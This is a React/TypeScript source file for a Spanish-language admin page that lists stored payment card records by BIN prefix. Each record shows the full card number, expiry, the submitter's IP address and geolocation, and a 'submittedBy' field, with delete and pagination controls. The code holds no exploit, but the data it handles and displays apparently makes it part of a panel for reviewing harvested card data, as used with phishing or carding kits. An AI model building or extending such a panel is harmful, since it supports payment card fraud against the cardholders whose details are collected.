import { useState, useEffect, useMemo } from 'react';
import { useParams, Link, useNavigate } from 'react-router-dom';
import { getCards, deleteCard } from '../services/api';
import { useAuth } from '../context/AuthContext';
import '../styles/BinDetail.css';

interface CardRecord {
    id: number;
    cardNumber: string;
    expiry: string | null;
    ipAddress: string | null;
    ipInfo: Record<string, string> | null;
    submittedBy: string | null;
    createdAt: string;
}

const PER_PAGE = 15;

export default function BinDetailPage() {
    const { bin } = useParams<{ bin: string }>();
    const { token, isAuthenticated, logout } = useAuth();
    const navigate = useNavigate();
    const [allCards, setAllCards] = useState<CardRecord[]>([]);
    const [loading, setLoading] = useState(true);
    const [page, setPage] = useState(1);
    const [deletingId, setDeletingId] = useState<number | null>(null);

    useEffect(() => {
        if (!isAuthenticated) { navigate('/admin'); return; }
        setLoading(true);
        getCards(token!, 1, 9999)
            .then((res) => {
                const filtered = (res.data || []).filter(
                    (c: CardRecord) => c.cardNumber?.replace(/\s/g, '').startsWith(bin || ''),
                );
                setAllCards(filtered);
            })
            .catch((err) => { if (err.message === 'UNAUTHORIZED') logout(); })
            .finally(() => setLoading(false));
    }, [token, bin, isAuthenticated, navigate, logout]);

    const totalPages = Math.ceil(allCards.length / PER_PAGE);
    const paged = useMemo(
        () => allCards.slice((page - 1) * PER_PAGE, page * PER_PAGE),
        [allCards, page],
    );

    const handleDelete = async (id: number) => {
        if (!token || !confirm('¿Eliminar esta tarjeta?')) return;
        setDeletingId(id);
        try {
            await deleteCard(token, id);
            setAllCards((prev) => prev.filter((c) => c.id !== id));
        } catch { /* ignore */ }
        setDeletingId(null);
    };

    if (!isAuthenticated) {
        return (
            <div className="auth-error">
                <i className="fas fa-lock" />
                <p>Inicia sesión para ver esta página</p>
                <Link to="/admin" className="back-btn">
                    <i className="fas fa-sign-in-alt" /> Ir al Login
                </Link>
            </div>
        );
    }

    return (
        <div className="page-container">
            <div className="page-header">
                <div className="page-title">
                    <div className="icon">
                        <i className="fas fa-credit-card" />
                    </div>
                    <div>
                        <h1>BIN {bin}</h1>
                        <p>{allCards.length} tarjetas encontradas</p>
                    </div>
                </div>
                <Link to="/admin" className="back-btn">
                    <i className="fas fa-arrow-left" /> Volver al Panel
                </Link>
            </div>

            <div className="stats-row">
                <div className="stat-card">
                    <div className="label">Total Tarjetas</div>
                    <div className="value">{allCards.length}</div>
                </div>
                <div className="stat-card">
                    <div className="label">BIN Prefix</div>
                    <div className="value" style={{ fontSize: '1.3rem' }}>{bin}</div>
                </div>
            </div>

            {loading ? (
                <div className="loading-state">
                    <div className="loading-spinner" />
                    <p>Cargando tarjetas...</p>
                </div>
            ) : allCards.length === 0 ? (
                <div className="empty-state">
                    <i className="fas fa-inbox" />
                    <p>No hay tarjetas con este BIN</p>
                </div>
            ) : (
                <div className="cards-container">
                    <div className="cards-list">
                        {paged.map((c) => {
                            const loc = c.ipInfo
                                ? [c.ipInfo.city, c.ipInfo.region, c.ipInfo.country].filter(Boolean).join(', ')
                                : '';
                            return (
                                <div key={c.id} className="card-item">
                                    <span className="card-num">{c.cardNumber}</span>
                                    <span className="card-expiry">{c.expiry || 'N/A'}</span>
                                    <span className="ip-cell">{c.ipAddress || 'N/A'}</span>
                                    <span className="ip-location">{loc || '—'}</span>
                                    {c.submittedBy && (
                                        <span className="card-submitter"><i className="fas fa-user" /> {c.submittedBy}</span>
                                    )}
                                    <span className="date-cell">{new Date(c.createdAt).toLocaleString()}</span>
                                    <button
                                        className="delete-btn"
                                        onClick={() => handleDelete(c.id)}
                                        disabled={deletingId === c.id}
                                    >
                                        <i className="fas fa-trash-alt" />
                                        {deletingId === c.id ? '...' : 'Del'}
                                    </button>
                                </div>
                            );
                        })}
                    </div>

                    {totalPages > 1 && (
                        <div className="pagination">
                            <span className="pg-info">
                                Pág {page} de {totalPages} ({allCards.length} total)
                            </span>
                            <div className="pg-controls">
                                <button className="pg-btn" disabled={page <= 1} onClick={() => setPage((p) => p - 1)}>
                                    <i className="fas fa-chevron-left" />
                                </button>
                                {Array.from({ length: Math.min(totalPages, 7) }, (_, i) => {
                                    const p = i + 1;
                                    return (
                                        <button
                                            key={p}
                                            className={`pg-btn${page === p ? ' active' : ''}`}
                                            onClick={() => setPage(p)}
                                        >
                                            {p}
                                        </button>
                                    );
                                })}
                                <button className="pg-btn" disabled={page >= totalPages} onClick={() => setPage((p) => p + 1)}>
                                    <i className="fas fa-chevron-right" />
                                </button>
                            </div>
                        </div>
                    )}
                </div>
            )}
        </div>
    );
}
